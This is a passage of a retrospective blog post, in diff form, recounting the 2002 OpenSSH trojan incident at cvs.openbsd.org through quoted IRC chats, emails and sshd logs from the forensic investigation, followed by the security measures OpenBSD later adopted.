+&lt;art&gt; focus on them.
+</pre>
+</div>
+
+Friedl, as the visible person for OpenSSH, was suddenly being asked a lot of
+questions, by many people...
+
+<div id="pre">
+<pre>
+&lt;markus&gt; Dear Markus
+&lt;markus&gt; Please could you give me a call at the number below? I'd like to talk to you
+&lt;markus&gt; about the trojan discovered in a recent version of OpenSSH.
+&lt;markus&gt; http://www.newscientist.com
+&lt;markus&gt; 151 Wardour Street London W1F 8WE
+&lt;markus&gt; Tel +44 (0)207 ### ####
+&lt;markus&gt; [all caps expletive deleted]
+&lt;hugh&gt; kein Mitleid fur markus..
+&lt;lebel&gt; since when does newscientist shows interrest in such cases?
+</pre>
+</div>
+
+<hr style="width: 20%" />
+
+<div id="pre">
+<pre>
+*markus* jon@cs.uit.no wants to know where the attacker logged in to
+*markus* should i tell him cvs.openbsd.org ?
+-&gt; *markus* I'd ask theo for advice first. He might not want to tell.
+*markus* i sent the 1st mail with a german timezone
+*markus* i'll wait for theo
+-&gt; *markus* you can already tell him that you want to get the approval of the
+            compromised system owner (in our case, cvs) before telling him.
+</pre>
+</div>
+
+Looking at the accounts who had connection for the largest numbers of different
+IP addresses, I quickly noticed <i>dev1</i>'s account had many. But this could
+have been dialup, so I reached to him privately and sent him a mail with the
+list of addresses.
+
+<div id="pre">
+<pre>
+-&gt; *dev1* is your .forward on cvs reliable?
+-&gt; *dev1* nevermind, mailing you anyways...
+*dev1* holy cow
+*dev1* there are a number of ips there i dont recognize
+*dev1* XXX.YYY/16, ZZZ.TTT/16, and SSS.RRR.QQQ/24 are the legit ones
+-&gt; *dev1* one of the unknown one resolves to .fi - did you travel for work or
+          somewhat?
+*dev1* no, i have never been to finland
+*dev1* this can't be. my passwd is &gt; 20 characters, so is the passphrase on my
+       private key
+-&gt; *dev1* dev2 had a 30char password on his key, too )-:
+-&gt; *dev1* sending you full log for your account.
+*dev1* this is very concerning
+*dev1* i will look into it immediately
+-&gt; *dev1* wait, those are password logons!
+-&gt; *dev1* someone knows your pass...
+*dev1* ?!#@
+*dev1* what. the. fuck.
+-&gt; *dev1* or the logs are damn well-faked
+*dev1* i know of no machine that can crack a 20+ character blowfish passwd
+-&gt; *dev1* neither do I. must be vulnerability somewhere.
+*dev1* [expletive deleted] [expletive deleted] [expletive deleted].
+*dev1* which netblocks are calgary?
+-&gt; *dev1* don't remember, but I grepped them out of logs.
+-&gt; *dev1* c2k2 209.115.217.214
+-&gt; *dev1* usenix 206.187.69.*
+-&gt; *dev1* theo's wavelan 199.185.13[67].*
+*dev1* does it look like anyone else is compromised?
+-&gt; *dev1* dev2, very likely. and perhaps more, I'm not finished investigating and
+          asking people to check the IP they have been loggin in from
+*dev1* i am very careful. long passwords, passphrased privkey, don't login from
+       untrusted hosts, don't blindly type "yes" to accept cvs keys.. :(
+*dev1* don't use cvs passwd anywhere else..
+-&gt; *dev1* there must be a flaw in the authentication somewhere. dev2 also is
+          paranoid. do you run ssh-agent? dev2 does and thought it might be
+          related.
+*dev1* WAIT
+*dev1* Aug 1 05:35:28
+*dev1* when did openssh trojan happen?
+*dev1* was it yesterday morning or 2 mornings ago?
+-&gt; *dev1* trojan on 07/31 16:47
+*dev1* ok
+*dev1* i hadnt changed my passwd at that point then
+*dev1* i do run ssh-agent, yes
+*dev1* in X
+*dev1* so best we can figure is unknown hole in openssh, great
+</pre>
+</div>
+
+So we had ourselves a second compromised account.
+
+<p>
+Meanwhile, Friedl told me privately that he was worried the first account
+compromise might have occured before the date of the backup Beck was uploading;
+after hesitating for a bit, I told Valchev to abort the transfer.
+
+<div id="pre">
+<pre>
+*markus* it could be too young
+*markus* jul23
+-&gt; *markus* yes it is likely too young. but I do not want to tell everyone yet,
+            until I have get information for everyone's logs.
+-&gt; *markus* now this is probably a stupid decision.
+*markus* /msg him
+-&gt; *markus* hmm, right
+-&gt; *pval* actually, no, stop this. this repository is too young, but don't
+           acknowledge it publically until I have finished checking all the logs
+*pval* stopped it
+*pval* what do you mean it is too young?
+*pval* ouch...
+-&gt; *pval* dev1's account was compromised early june.
+*pval* i see now (~miod/log/)
+</pre>
+</div>
+
+<hr style="width: 20%" />
+
+<div id="pre">
+<pre>
+&lt;deraadt&gt; if anyone has not checked the security of their home machines yet
+&lt;deraadt&gt; please tell me to disable your account until you do so
+&lt;dev1&gt; leave mine disabled over the weekend
+&lt;dev1&gt; i will be away
+&lt;dev1&gt; with machines at home off :/
+</pre>
+</div>
+
+I sent a first quick analysis report to a few people.
+
+<div id="quote">
+<pre>
+Date: Fri, 2 Aug 2002 18:41:13 +0000
+From: Miod Vallat
+To: Theo de Raadt, Niels Provos, dev1, dev2
+Subject: More bad news
+
+Apparently, dev1's account has been compromised since mid-june. We are
+investigating the logs, but this includes login as dev1 originating
+from these hosts:
+
+Name:    sievi.fi
+Address:  194.197.220.8
+
+Name:    mars.raketti.net
+Address:  212.146.0.34
+
+Name:    server.kopteri.net
+Address:  212.246.72.18
+
+Name:    web.ctrlv.net
+Address:  64.246.22.25
+
+
+Miod
+</pre>
+</div>
+
+At this point, for every developer account on <tt>cvs.openbsd.org</tt>
+(there were 93 of them), I would send a mail with subject <i>"Your cvs
+connection log"</i>, listing all the IP addresses I could not make
+sense of, asking them to confirm that they were legitimate.
+
+<p>
+In particular, there had been many connections during
+<a href="https://www.usenix.org/legacy/publications/library/proceedings/usenix02/">Usenix</a>
+in june, which appeared as unusual in the logs of some developers.
+
+<p>
+As an example, there had been one case of a developer using an internet
+connection from his hotel room during Usenix.
+
+<div id="quote">
+<pre>
+Date: Fri, 2 Aug 2002 19:41:40 +0000
+From: Miod Vallat
+To: Daniel Hartmeier
+Subject: Re: Your cvs connection log
+
+&gt; &gt;  63.161.204.177
+&gt;
+&gt; This I don't, do you have a timestamp for when I accessed CVS from
+&gt; there? If it was during usenix, it might be the hotel room's
+&gt; address (of the Marriott in Monterey), stsn.com looks vaguely familiar,
+&gt; but I'm not sure.
+
+Only one connection:
+
+Jun 12 15:37:32 cvs sshd[21952]: Accepted publickey for dhartmei from 63.161.204.177 port 33743 ssh2
+
+Miod
+</pre>
+</div>
+
+<hr style="width: 20%" />
+
+<div id="quote">
+<pre>
+Date: Fri, 2 Aug 2002 19:51:19 +0000
+From: Miod Vallat
+To: Daniel Hartmeier
+Subject: Re: Your cvs connection log
+
+&gt; Yes, that's it. I checked stsn.com's web site, they provide broadband
+&gt; to Marriott, and I used the in-room internet access on my first day in
+&gt; Monterey because wireless was not yet working. That must have been
+&gt; around June 12th. If that matches the cvs log, it's harmless, my laptop
+&gt; isn't compromised, either.
+
+Confirmed by angelos. I did not know that some of us had used the
+in-room access.
+
+Miod
+</pre>
+</div>
+
+After the first few developers gave me such details, I would send messages
+looking like this.
+
+<div id="quote">
+<pre>
+Date: Fri, 2 Aug 2002 14:30:11 -0600 (MDT)
+From: Miod Vallat
+To: random OpenBSD developer
+Subject: Your cvs.openbsd.org connection log
+
+Here is a list of all the IP addresses you have supposedly used
+to login to cvs, over the last two months.
+
+Addresses used during c2k2, usenix and lsm (if you had been attending)
+have been annotated in the list. Some addresses from these events might
+have been left unrecognized, though. We can check later when connections
+from unrecognized addresses did happen.
+
+Can you take a few minutes to check these addresses, and tell me if there are
+any that you could never have used to login, which would tend to prove that
+your account on cvs has been compromised.
+
+Thanks in advance.
+Miod
+
+ 206.187.69.152                 usenix
+ 206.187.69.209                 usenix
+ [other IP addresses following here]
+</pre>
+</div>
+
+Although I had not told publicly that I would send these mails, many developers
+became aware of them, and some became worried as they didn't receive anything
+from me.
+
+<div id="pre">
+<pre>
+*dugsong* can you send me any login records i have? aaron and ericj are telling
+          me i should review them also
+-&gt; *dugsong* your records are ok, that's why I did not send you any mail on the
+             subject.
+*dugsong* could you please send them anyway? i'd like to verify, just in case
+-&gt; *dugsong* aargh, I have erased your logs, lemme regenerate them
+[...]
+*dugsong* thank you, looks fine. :-)
+</pre>
+</div>
+
+While sorting things and sending mails, I was also involved in several
+private conversations on the developers chat.
+
+<p>
+One with Theo de Raadt, as he had read the "Bad news" mail:
+
+<div id="pre">
+<pre>
+*deraadt* sigh
+*deraadt* with his keys?
+-&gt; *deraadt* password
+*deraadt* password?!
+*deraadt* holy shit
+-&gt; *deraadt* ~miod/log/dev1, bad ips are the non-OK in ~miod/log/dev1.ip
+-&gt; *deraadt* I'm half-done checking them and asking people for confirmation when
+             I can not identify all the hosts.
+*deraadt* 65.101.201.71 is denver airport?
+*deraadt* looks like it
+-&gt; *deraadt* likely, fgsch has it too.
+*deraadt* and jsyn
+</pre>
+</div>
+
+Another with <i>dev1</i>, trying to figure out more unknown IP addresses:
+
+<div id="pre">
+<pre>
+*dev1* still there?
+-&gt; *dev1* yes
+*dev1* ok, c2k2 we were on a sprint connection first day right?
+*dev1* only unexplainable publickey authentications are 209.103.3.4
+*dev1* Name: spc-isp-van-uas-16-3.sprint.ca
+*dev1* that has to be legit, it's the day i arrived, and its a western canada address..
+</pre>
+</div>
+
+De Raadt was also worried about a particular developer from the
+<a href="https://monkey.org/">monkey</a> group, which had been
+<a href="https://web.archive.org/web/20050307125836/http://archives.neohapsis.com/archives/bugtraq/2002-05/0281.html">targeted</a>
+earlier in may this year.
+
+<div id="pre">
+<pre>
+*deraadt* no ericj?
+-&gt; *deraadt* apparently no, but he's paranoid
+*deraadt* i mean
+*deraadt* where is his .ip file
+-&gt; *deraadt* he wants his old pwd erased
+-&gt; *deraadt* people that are ok gets their files removed, easier for me. ericj had only monkey.org and c2k2 and arbor.net addresses
+*deraadt* there is no ericj.ip
+*deraadt* oh ok
+*deraadt* monkey?
+*deraadt* i think that is the START OF ALL THIS
+-&gt; *deraadt* oh, so true. forgot this
+-&gt; *deraadt* regenerating all, wait a minute
+*deraadt* if monkey is in there, it should be left
+*deraadt* we know it is a problem
+*deraadt* keys got stolen from there
+*deraadt* dev2' keys are worrying too
+*deraadt* but he was there for a week
+-&gt; *deraadt* checking again, there was no monkey.org in ericj.ip - only
+             arbor.net and his home cable modem ip
+-&gt; *deraadt* (all .ip files are there and I won't delete them, only annotate)
+</pre>
+</div>
+
+<i>dev1</i> shared some thoughts with me.
+
+<div id="pre">
+<pre>
+*dev1* it simply seems that cvs was owned and they got my passwd that way
+*dev1* i doubt highly that i was the attack vector at which they owned cvs
+*dev1* keep me updated
+-&gt; *dev1* sure, I'm busy browsing logs and such, but don't worry, you'll know
+          what I'll find since you are concerned.
+*dev1* most concerned about what happened to cvs, but also, would be nice to
+       prove my innocence ;)
+</pre>
+</div>
+
+Most developers were quick to provide details on their connection logs. For
+example:
+
+<div id="quote">
+<pre>
+Date: Fri, 2 Aug 2002 20:06:35 +0000
+From: Miod Vallat
+To: Federico G. Schwindt
+Subject: Re: Your cvs connection log
+
+&gt; &gt;  65.101.201.251
+&gt;
+&gt;   hmm, i'm not sure about this. i'm trying to check from where it comes.
+
+Very likely Denver airport. Did you use wavelan there, with Theo and
+jsyn?
+
+&gt;   is this a general email to everyone right? or i am being suspected?
+General email to all persons I have not enough knowledge of their ISP
+and habits to prove their IP valid without their help.
+
+Miod
+</pre>
+</div>
+
+<hr style="width: 20%" />
+
+<div id="quote">
+<pre>
+Date: Fri, 2 Aug 2002 20:39:18 +0000
+From: Miod Vallat
+To: David Lebel
+Subject: Re: Your cvs.openbsd.org connection log, tabernacle!
+
+&gt; &gt;  199.185.231.5
+&gt; &gt;  199.185.231.94
+&gt;
+&gt; duh! sparc.ports and sparc64.ports
+
+Well, when you have 93 logs to check, you do not take the time to
+reverse-dns all the IPs... I did this for the a-j block, now I'm tired.
+And although these addresses were familiar, I did not recognize them.
+
+Anyways, you're clean. Thanks for the info.
+
+Miod
+</pre>
+</div>
+
+<hr style="width: 20%" />
+
+<div id="quote">
+<pre>
+Date: Fri, 2 Aug 2002 22:03:25 +0000
+From: Miod Vallat
+To: M. Warner Losh
+Subject: Re: Your cvs.openbsd.ord connection log
+
+&gt; These look good to me.  The 206.168.13.253 address is my laptop at
+&gt; work.  The .66 address is my machine at home.
+
+Perfect. Your account is ok. Thanks for the information.
+
+Miod
+</pre>
+</div>
+
+At this point, I had enough information to send a more detailed analysis report.
+
+<div id="pre">
+<pre>
+&lt;miod&gt; ok, summary sent to [private OpenBSD mailinglist]. I forgot to add a
+       "don't panic" at the end.
+</pre>
+</div>
+
+<hr style="width: 20%" />
+
+<div id="quote">
+<pre>
+Date: Fri, 2 Aug 2002 22:41:12 +0000
+From: Miod Vallat
+To: private OpenBSD mailinglist
+Subject: A summary on the current cvs.openbsd.org issues
+
+Hello.
+
+  Most of the people who have been connecting to cvs during the last two
+month have received an inquiry message from me, asking them to confirm
+they have really been using all the IP addresses which have been using
+to log in to your accounts, over the last two months.
+
+  If you have received such a mail and answered, I am thankful for your
+information. If you have not received such a mail, this probably means
+that either you are only connecting from one or two well-known
+addresses, or that I have been able to check them for you (french people
+mostly, and horacio). If you have received such a mail and did not
+answer it yet, please do. It's important.
+
+  If you still have cvs access and look in ~miod/log, you can check your
+own connection logs, in the file named after your login name (for
+example, my own connection logs are in ~miod/log/miod). The list of all
+the IP addresses used to login are in ~miod/log/miod.ip.GOOD since they
+are known to be good. If there is a doubt, the filename is foo.ip. If
+there is proof that the account has been compromised, the filename is
+foo.ip.BAD. If you feel paranoid, I'm strongly recommending checking
+your own connection log. Really. Now.
+
+  So, unfortunately, at least two accounts on cvs have been compromised:
+dev1, and dev2. The oldest trace of an illegitimate connection is
+dated 06/21. ANY REPOSITORY COPY MORE RECENT THAT THIS DATE SHOULD NOT
+BE CONSIDERED TRUSTWORTHY. Sorry fellas, I wish this was not the case.
+
+  Both dev1 and dev2 have &gt; 20 character passwords associed to their
+public keys. Moreover, the first break-in as dev1 uses the password
+authentication. So, either dev1 and dev2 have been talking in their
+sleep, or the intruder managed to exploit some vulnerability. Both dev1
+and dev2 use ssh-agent. YOU MIGHT WANT TO DISABLE ssh-agent UNTIL
+FURTHER NOTICE, perhaps it is vulnerable to something (hence the recent
+commit from Theo to constrain it to a specific group).
+
+  Be sure to change your password and keys you had been using to connect
+to cvs. Who knows how much information has been stoled from there.
+
+  Looking at the authlog from today, we have proof that someone has
+attempted to connect to cvs as dev1 AND dev2 in a very short
+timeframe. This means the vulnerability information, or password
+information, has been shared...
+
+  The offending IP addresses are:
+
+ 194.197.220.8  sievi.fi                dev1@ as password 06/21-07/05
+ 212.146.0.34   mars.raketti.net        dev1@ as password 07/25-07/26
+ 212.246.72.18  server.kopteri.net      dev1@ as password 07/31-08/01
+ 64.246.22.25   web.ctrlv.net           dev1@ as password 07/11
+
+ 129.242.13.151 lgserv3.stud.cs.uit.no  dev2@ as publickey 07/25
+ 203.62.158.32  snsonline.net           dev2@ as publickey 07/26-07/31
+
+  The ssh backdoor comes from snsonline.net:
+Jul 31 16:44:53 cvs sshd[15840]: Accepted publickey for dev2 from 203.62.158.32 port 65502 ssh2
+and the corrupted files are dated from 16:47 this same day - although
+last will not show this login period.
+
+kopteri.net still tried to log in as dev1@ and dev2@ today.
+
+We are trying to collect more data, while dev1 and dev2 have been
+contacting the originating systems, which have probably been owned
+previously.
+
+You probably won't feel any better after reading this, but at least
+we're trying to keep you informed...
+
+Miod, with the help of dev1, dev2, Peter Valchev, and Theo
+</pre>
+</div>
+
+<hr style="width: 20%" />
+
+<div id="pre">
+<pre>
+*millert* Wow. Thanks for tracing this.
+-&gt; *millert* well, now I don't have to reply "thanks" to MAXINT messages in my
+             mailbox (-,
+</pre>
+</div>
+
+The fact that the trojaned OpenSSH archives had been noticed and removed
+apparently did not prevent the people who had compromised the two accounts from
+trying to connect.
+
+<div id="pre">
+<pre>
+*deraadt* notice something?
+*deraadt* recent passwd failure for dev1
+*deraadt* so they are still trying
+*deraadt* i mean
+*deraadt* Aug  2 10:33:16 cvs sshd[3817]: Failed none for dev1 from 212.246.72.18 port 40008 ssh2
+*deraadt* that is today
+*deraadt* someone is still trying to get in today
+-&gt; *deraadt* scary.
+*deraadt* Aug  2 15:04:14 cvs sshd[28637]: Failed none for dev2 from 212.246.72.18 port 41098 ssh2
+*deraadt* there too
+*deraadt* same person has dev1 and dev2
+-&gt; *deraadt* how surprising. problem now is to know how they get their keys
+             stolen.
+*deraadt* your log does not count today
+*deraadt* because you do not show that ip for dev2
+*deraadt* dev1 password
+*deraadt* dev2 key
+-&gt; *deraadt* no, I regenerated it a few hours ago. I was mostly looking for the
+             oldest compromise proof
+-&gt; *deraadt* ip is kopteri.net, one in dev1's file
+</pre>
+</div>
+
+Answers to my emails were still going in.
+
+<div id="pre">
+<pre>
+&lt;miod&gt; still 26 unclarified accounts.
+&lt;miod&gt; 25...
+[...]
+&lt;miod&gt; ... 23
+&lt;miod&gt; if this wasn't friday afternoon/evening/night (pick your timezone), I
+       would be worried.
+[...]
+&lt;miod&gt; 22
+&lt;mickey&gt; 21
+&lt;miod&gt; who has not answered his inquisition mail, eh?
+&lt;miod&gt; 21 indeed.
+</pre>
+</div>
+
+It was already august 3rd when I acknowledged that the source code repositories
+had apparently not been tampered with.
+
+<div id="quote">
+<pre>
+Date: Sat, 03 Aug 2002 10:39:49 +0900
+From: <a href="http://www.itojun.org/itojun.html">Jun-ichiro Itojun Hagino</a>
+To: private OpenBSD mailinglist
+Subject: Re: A summary on the current cvs.openbsd.org issues
+
+&gt;  So, unfortunately, at least two accounts on cvs have been compromised:
+&gt;dev1, and dev2. The oldest trace of an illegitimate connection is
+&gt;dated 06/21. ANY REPOSITORY COPY MORE RECENT THAT THIS DATE SHOULD NOT
+&gt;BE CONSIDERED TRUSTWORTHY. Sorry fellas, I wish this was not the case.
+
+what kind of action do you plan to take?  like, bring back
+6/20 copy of repository into cvs.openbsd.org:/cvs and commit all
+changes again?
+
+itojun
+</pre>
+</div>
+
+<hr style="width: 20%" />
+
+<div id="quote">
+<pre>
+Date: Sat, 3 Aug 2002 01:43:46 +0000
+From: Miod Vallat
+To: <a href="https://undeadly.org/cgi?action=article&sid=20071030220114">Jun-ichiro Itojun Hagino</a>
+Cc: private OpenBSD mailinglist
+Subject: Re: A summary on the current cvs.openbsd.org issues
+
+&gt; &gt;  So, unfortunately, at least two accounts on cvs have been compromised:
+&gt; &gt;dev1, and dev2. The oldest trace of an illegitimate connection is
+&gt; &gt;dated 06/21. ANY REPOSITORY COPY MORE RECENT THAT THIS DATE SHOULD NOT
+&gt; &gt;BE CONSIDERED TRUSTWORTHY. Sorry fellas, I wish this was not the case.
+&gt;
+&gt;       what kind of action do you plan to take?  like, bring back
+&gt;       6/20 copy of repository into cvs.openbsd.org:/cvs and commit all
+&gt;       changes again?
+
+Some of us, and especially art@ and kjell@ (thanks guys!) and anyone I
+have forgotten here (please forgive me) are addressing the boring task
+of reading the diffs between 3.1 and -CURRENT and making sure that
+nothing strange has ``made its way'' in the current cvs source.
+
+XF4/ has been checked by matthieu@ and myself to be clean.
+
+ports/ has been checked by couderc@, naddy@ and nino@ to be clean.
+
+Miod
+</pre>
+</div>
+
+<hr style="width: 20%" />
+
+<div id="quote">
+<pre>
+Date: Sat, 3 Aug 2002 01:46:00 +0000
+From: Miod Vallat
+To: private OpenBSD mailinglist
+Cc: Jun-ichiro Itojun Hagino
+Subject: Re: A summary on the current cvs.openbsd.org issues
+
+&gt; Some of us, and especially art@ and kjell@ (thanks guys!) and anyone I
+&gt; have forgotten here (please forgive me) are addressing the boring task
+&gt; of reading the diffs between 3.1 and -CURRENT and making sure that
+&gt; nothing strange has ``made its way'' in the current cvs source.
+&gt;
+&gt; XF4/ has been checked by matthieu@ and myself to be clean.
+&gt;
+&gt; ports/ has been checked by couderc@, naddy@ and nino@ to be clean.
+
+Of course, the more eyes look at this, the better.
+
+Miod (mind if I get some sleep now? It's 3:45am)
+</pre>
+</div>
+
+<hr style="width: 20%" />
+
+<div id="quote">
+<pre>
+Date: Sat, 3 Aug 2002 16:15:25 +0000 (UTC)
+From: Christian Weisgerber
+To: private OpenBSD mailinglist
+Subject: Re: A summary on the current cvs.openbsd.org issues
+
+&gt; ports/ has been checked by couderc@, naddy@ and nino@ to be clean.
+
+I suggest that maintainers make an additional pass over their
+respective ports.  In particular network services, clients, and
+suid things.  If somebody slipped in a vulnerability or reintroduced
+one by removing a fix, it's virtually undetectable for anybody not
+familiar with the port.
+</pre>
+</div>
+
+Later in the morning, Grabowski reported confidence in the source code checks.
+
+<div id="pre">
+<pre>
+&lt;art&gt; Ok. either the crackers were really stupid or too good to leave any traces.
+&lt;art&gt; I've checked the diff three times.
+</pre>
+</div>
+
+<hr style="width: 20%" />
+
+<div id="pre">
+<pre>
+&lt;art&gt; Four more hours of diff reading.. nothing.
+&lt;art&gt; Can someone look carefully through libc once more?
+&lt;matthieu&gt; I did a couple of hours ago found nothing
+&lt;art&gt; ok. I'm dropping this. I can't find anything.
+</pre>
+</div>
+
+Since people had to generated new ssh keys to connect to
+<tt>cvs.openbsd.org</tt>, Friedl shared a useful advice.
+
+<div id="quote">
+<pre>
+Date: Sat, 3 Aug 2002 00:33:04 +0200
+From: Markus Friedl
+To: private OpenBSD mailinglist
+Subject: ssh public keys and cvs
+
+hi,
+
+my new rsa key is resticted to the places i cvs commit from:
+
+$ cat ~markus/.ssh/authorized_keys
+from="213.23.*.*,151.136.100.2" ssh-rsa AAAAB3NzaC...
+$
+
+i suggest that you to do something similar.
+
+so perhaps we should have a cronjob to remove keys w/o from= attributes
+(or even add the keys to the changelist).
+
+-markus
+</pre>
+</div>
+
+A few days later, on the 7th, <i>dev2</i> asked me to check for rogue login
+attempts to his account.
+
+<div id="pre">
+<pre>
+*dev2* can you grep current authlog for dev2?
+-&gt; *dev2* sure, waitasec
+-&gt; *dev2* Aug  7 07:59:51 cvs sshd[7184]: Failed none for dev2 from AAA.BBB.CCC.DDD port 25988 ssh2
+-&gt; *dev2* Aug  7 07:59:53 cvs sshd[7184]: Failed password for dev2 from AAA.BBB.CCC.DDD port 25988 ssh2
+-&gt; *dev2* Aug  7 07:59:59 cvs sshd[7184]: Accepted password for dev2 from EEE.FFF.GGG.HHH port 25988 ssh2
+-&gt; *dev2* only this today.
+*dev2* looks ok
+-&gt; *dev2* no pubkey since aug 5th
+*dev2* hm, forgot new rsa passphrase
+-&gt; *dev2* aug 4th even
+-&gt; *dev2* all addresses are in XXX.YYY
+-&gt; *dev2* except
+-&gt; *dev2* Aug  2 15:04:14 cvs sshd[28637]: Failed none for dev2 from 212.246.72.18 port 41098 ssh2
+*dev2* [expletive deleted]
+-&gt; *dev2* oh, and AAA.BBB.CCC.DDD but this one is legitimate I guess
+*dev2* that's the bad on
+-&gt; *dev2* aug 2nd... they got tired
+*dev2* yes AAA.BBB.CCC.DDD == work
+*dev2* 212.246.72.18 == kopteri
+-&gt; *dev2* Aug  2 10:32:31 cvs sshd[1806]: Connection from 212.246.72.18 port 40004
+-&gt; *dev2* Aug  2 10:32:37 cvs sshd[1806]: Failed none for dev1 from 212.246.72.18 port 40004 ssh2
+-&gt; *dev2* Aug  2 10:32:40 cvs sshd[1806]: Failed password for dev1 from 212.246.72.18 port 40004 ssh2
+-&gt; *dev2* Aug  2 10:32:41 cvs sshd[1806]: Failed password for dev1 from 212.246.72.18 port 40004 ssh2
+-&gt; *dev2* Aug  2 10:33:09 cvs sshd[3817]: Connection from 212.246.72.18 port 40008
+-&gt; *dev2* Aug  2 10:33:16 cvs sshd[3817]: Failed none for dev1 from 212.246.72.18 port 40008 ssh2
+-&gt; *dev2* Aug  2 15:04:09 cvs sshd[28637]: Connection from 212.246.72.18 port 41098
+-&gt; *dev2* Aug  2 15:04:14 cvs sshd[28637]: Failed none for dev2 from 212.246.72.18 port 41098 ssh2
+*dev2* did they probe dev1 again?
+-&gt; *dev2* then nothing with this address afterwards.
+-&gt; *dev2* I think theo has blocked them permanently, not sure.
+</pre>
+</div>
+
+And then it was business as usual. I sent a last clarification mail in the
+evening.
+
+<div id="quote">
+<pre>
+Date: Wed, 7 Aug 2002 23:43:14 +0000
+From: Miod Vallat
+To: private OpenBSD mailinglist
+Subject: A reminder on cvs.openbsd.org accounts
+
+After the recent events, more accounts than usual are disabled.
+
+Some of you, upon receiving my inquiry about their connection logs, have
+asked whether their accounts have been disabled, or listed as suspect,
+or whatever.
+
+This is not the case. However, due to the ``emergency situation'', a lot
+of accounts are currently temporarily disabled. This is not your fault!
+
+If you are trying to access cvs but fail, this is very likely for one or
+more of three reasons:
+- you have not shown much commit activity recently, so your account is
+  temporarily disabled. If you have commits to do, just pop up on icb
+  and talk to people, and you'll eventually get your account enabled
+  again until next time.
+- you have not changed password since 08/01, so your account is
+  temporarily disabled. Just send an updated blowfish password to
+  pvalchev@ or myself, or Theo after he is back, and your account will
+  be reenabled again.
+- you are not a touch typist, and are trying to enter your password
+  without looking at the keyboard. Just be careful, and you will
+  eventually log in.
+
+Hope this helps.
+
+Miod
+</pre>
+</div>
+
+Not much happened, after that.
+
+<p>
+I don't know if people were successful communicating with the
+<tt>kopteri.net</tt> administrators (all the machines from which rogue
+connections to <i>dev1</i> and <i>dev2</i>'s accounts had probably been
+compromised).
+
+<p>
+The <tt>web.snsonline.net</tt> machine in Melbourne, which was the machine the
+trojan would try to connect to, was taken off the network and reinstalled from
+scratch by its legitimate owners, as
+<a href="https://slashdot.org/comments.pl?sid=37188&cid=3991299">reported by
+themselves</a> on slashdot.
+
+<p>
+I also don't know how <i>dev1</i>'s password and <i>dev2</i>'s private key got
+stolen. It is likely that the compromission of both accounts happened during
+Usenix 2002, which took place from june 10th to june 15th earlier that year,
+which both developers attended.
+
+<p>
+At that time, the latest OpenSSH codebase was vulnerable to a
+<a href="https://www.openssh.org/txt/preauth.adv">security issue</a>
+which could allow privilege escalation.
+
+<p>
+The introduction of privilege separation, splitting the operation of the ssh
+server into multiple processes with different credentials, written by Niels
+Provos and introduced with OpenSSH 3.3, was supposed to mitigate that
+vulnerability, but <i>dev1</i> and <i>dev2</i> might not have been running
+up-to-date versions, or might have made a mistake in their configuration.
+
+<p>
+Another possible vector was an exploitable bug in the Apache web server
+part of the OpenBSD base system (as mentioned by <i>dev2</i> in one of our
+private conversations), for which a fix was
+<a href="https://www.openbsd.org/errata31.html#httpd">released</a>
+on june 19th.
+
+<p>
+We probably will never know.
+
+<hr/>
+
+Over the following years, the OpenBSD project learned from this account
+compromission and applied the following process changes and countermeasures:
+<ul>
+<li>
+compilation of third-party software in the
+ports
+collection was modified to always regenerate the (unreadable) <tt>configure</tt>
+scripts from the <tt>configure.in</tt> (later <tt>configure.ac</tt>) readable
+source, to avoid risking running untrusted code during the <tt>configure</tt>
+process (this work had started prior to these events, after other popular
+software were trojaned in a similar way).
+<li>
+compilation of third-party software and of the base system slowly moved to a
+least-privilege model, where everything but actual file installation are
+performed using an unprivileged user.
+<li>
+deliverables from the OpenBSD project are now cryptographically signed, using
+the simple
+<a href="https://man.openbsd.org/signify"><tt>signify</tt></a>
+tool (the OpenSSH source archives were also GPG-signed before).
+<li>
+finer groups were created on <tt>cvs.openbsd.org</tt> to reduce the risk of a
+developer account beind able to access files not related to their line of work
+in the project.
+<li>
+the internal OpenBSD network was also reworked to use more distinct networks,
+reducing the ability for system and package build machines to reach systems
+hoarding sensitive data.
+</ul>
+
+These events also spawned an internal discussion about
+<a href="https://en.wikipedia.org/wiki/Version_control">Version Control
+Systems</a>.
+
+<p>
+Were there VCS software where tampering with the repository
+would be easy to notice, due to cryptographic checksums?
+
+<p>
+At that time, there
+wasn't any in the free software world, although the (now long-dead and
+completely forgotten)
+<a href="https://web.archive.org/web/20020804165956/http://www.opencm.org/">OpenCM</a>
+project was being promising... but not yet ready.
+
+<p>
+We were really lucky that the intruders apparently didn't really know what to do
+with the two compromised accounts. I think we handled that embarassing situation
+quite well, with a public advisory within hours of the discovery of the
+tampering, and good teamwork on forensics and actual code check.
+<hr/>
+
+<p>
+At that time, trojans in configure scripts were something new, and
+none of them were well-engineered.
+
+<p>
+Nowadays, these would be described as
+<a href="https://en.wikipedia.org/wiki/Supply_chain_attack"><i>supply-chain
+attacks</a></i>.
+
+<p>
+Is it time to add "<i>Only one supply chain attack, in a heck of a long
+time!</i>" claim to the
+<a href="https://www.openbsd.org/">OpenBSD</a> main page?
+
+</div>
+<div id="footer">
+<hr/>
+<address>miod@online.fr</address>
+</div>
+</body></html>
